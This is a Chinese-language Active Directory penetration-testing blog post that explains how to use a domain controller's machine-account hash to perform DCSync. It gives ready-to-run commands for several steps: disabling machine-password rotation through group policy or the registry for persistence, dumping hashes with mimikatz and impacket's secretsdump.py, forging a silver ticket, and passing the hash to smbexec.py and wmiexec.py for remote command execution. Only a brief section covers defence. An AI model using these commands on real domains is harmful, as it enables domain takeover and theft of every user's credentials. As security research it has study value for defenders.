---
layout: post
title: 域渗透——使用MachineAccount实现DCSync
---


## 0x00 前言
---

在之前的文章[《域渗透——DCSync》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)提到过DCSync的利用条件：

获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

本文将要补全上篇文章中未提到的最后一种利用方法，介绍如何通过域控制器的计算机帐户口令hash实现DCSync

## 0x01 简介
---

本文将要介绍以下内容：

- MachineAccount简介
- 获得MachineAccount口令hash的方法
- 使用MachineAccount实现DCSync
- 防御检测

## 0x02 MachineAccount简介
---

MachineAccount是每台计算机在安装系统后默认生成的计算机帐户

计算机帐户的密码存储在注册表的位置：`HKLM\SECURITY\Policy\Secrets\$machine.ACC`

如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的NTDS.dit文件中

计算机帐户的密码默认每30天自动更新，密码长度为120个字符，所以说，即使获得了计算机帐户密码的hash，也很难还原出计算机帐户的明文口令

#### 关闭当前计算机帐户密码自动更新的两种方法（适用于工作组）：

1.修改组策略

组策略位置：

```
Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-1.png)

默认未启用，如果设置为启用后，将会停止更新密码

参考资料：

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc785826(v=ws.10)

2.直接修改注册表

注册表位置：`HKLM\System\CurrentControlSet\Services\Netlogon\Parameters\`

将`DisablePasswordChange`的值设为`1`

#### 关闭域内计算机帐户密码自动更新的两种方法（适用于域网络）：

1.修改组策略

这里需要修改域组策略，在域控制器上打开`Group Policy Management`后，选择`Default Domain Policy`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-2.png)

组策略位置：

```
Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\
```

2.修改组策略的配置文件

Default Domain Policy对应的guid为`31B2F340-016D-11D2-945F-00C04FB984F9`

配置文件路径为：

```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
```

例如我的测试环境下，路径对应为：

```
\\test.com\SYSVOL\test.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
```

修改文件`GptTmpl.inf`，在`[Registry Values]`下添加新的内容：

```
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,1
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/2-3.png)

强制域控制器更新组策略，命令如下：

```
gpupdate /force
```

配置完成，将系统时间调快30天，hash保持不变

## 0x03 获得MachineAccount口令hash的方法
---

### 1.通过注册表文件导出当前计算机帐户的口令hash

mimikatz命令示例：

```
privilege::debug
token::elevate
lsadump::secrets
```

返回的结果中，`$machine.ACC`项对应计算机帐户，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/3-1.png)

其他从注册表导出的方法可参考之前的文章[《渗透技巧——通过SAM数据库获得本地用户hash》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/)

### 2.使用DCSync导出所有计算机帐户的口令hash

#### (1)使用mimikatz

在域控制器上使用mimikatz导出域内所有用户的hash，命令示例：

```
mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
```

其中以`$`字符结尾的为计算机帐户

其他环境下的使用方法可参考之前的文章[《域渗透——DCSync》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)

#### (2)使用[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py)

需要安装Python环境和Impacket包，实际使用时可以将Python代码编译成exe文件

命令示例：

```
python secretsdump.py test/Administrator:DomainAdmin123!@192.168.1.1
```

[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py)相比于mimikatz，最大的优点是支持从域外的计算机连接至域控制器

secretsdump.py的实现原理：

使用计算机帐户口令hash通过smbexec或者wmiexec远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的hash，同时通过Dcsync或从NTDS.dit文件中导出所有域用户的hash

### 3.通过漏洞CVE-2020-1472

参考资料：

https://www.secura.com/pathtoimg.php?id=2055

CVE-2020-1472能够在未授权的状态下远程修改目标计算机帐户的口令hash

**注：**

CVE-2020-1472只能修改域控制器NTDS.dit文件中保存的计算机帐户hash，无法修改注册表中保存的本地计算机帐户hash

当域控制器中NTDS.dit文件和注册表文件的计算机帐户口令hash不同步时，有可能影响系统的正常功能

## 0x04 使用MachineAccount实现DCSync
---

例如，我们获得了域控制器`DC1`的计算机帐户口令hash为`7da530fba3b15a2ea21ce7db8110d57b`

### 1.使用mimikatz

这里需要制作白银票据(Silver Ticket)，接着获得LDAP服务的访问权限，细节可参考之前的文章《域渗透——Pass The Ticket》

命令示例：

```
mimikatz "kerberos::golden /domain:test.com /sid:S-1-5-21-254706111-4049838133-2416586677 /target:DC1.test.com /service:LDAP /rc4:7da530fba3b15a2ea21ce7db8110d57b /user:krbtgt /ptt" "lsadump::dcsync /domain:test.com /all /csv" exit
```

在细节上需要注意以下方面：

- 只能在域内计算机上运行，不支持域外
- /sid表示域的sid，获取方法可参考之前的文章[《渗透基础——活动目录信息的获取》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/)
- /rc4表示计算机帐户的NTLM hash
- /user:krbtgt表示伪造成用户krbtgt，生成票据

**注：域sid的简单获取方法**

任一域用户的sid去除最后一位就是域的sid

### 2.使用secretsdump

命令示例：

```
python secretsdump.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1
```

在细节上需要注意以下方面：

- secretsdump支持从域外的计算机连接至域控制器
- 如果使用域内普通计算机帐户的口令hash连接对应的计算机，那么会失败，提示`rpc_s_access_denied`
- 可以通过[wmiexec.py](https://github.com/SecureAuthCorp/impacket/tree/0b46f198042626a1ecd2846d22db355453e29c03/examples)或[smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/0b46f198042626a1ecd2846d22db355453e29c03/examples/smbexec.py)远程执行cmd命令

命令示例：

```
python smbexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
python wmiexec.py -hashes :7da530fba3b15a2ea21ce7db8110d57b test/DC1$@192.168.1.1 whoami /priv
```

**注：**

使用计算机帐户具有高权限，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-9-19/4-1.png)

## 0x05 防御检测
---

检测DCSync后门的方法可参考[《域渗透——DCSync》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)

站在防御的角度，如果域管理员的权限被攻击者获得，在尝试踢出攻击者的过程中，不仅需要修改域管理员用户的口令，同样需要更新计算器帐户的口令hash，检测域组策略是否被配置成开启`DisablePasswordChange`

## 0x06 小结
---

本文介绍了通过域控制器的计算机帐户口令hash实现DCSync的方法，分析利用思路，给出防御建议。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




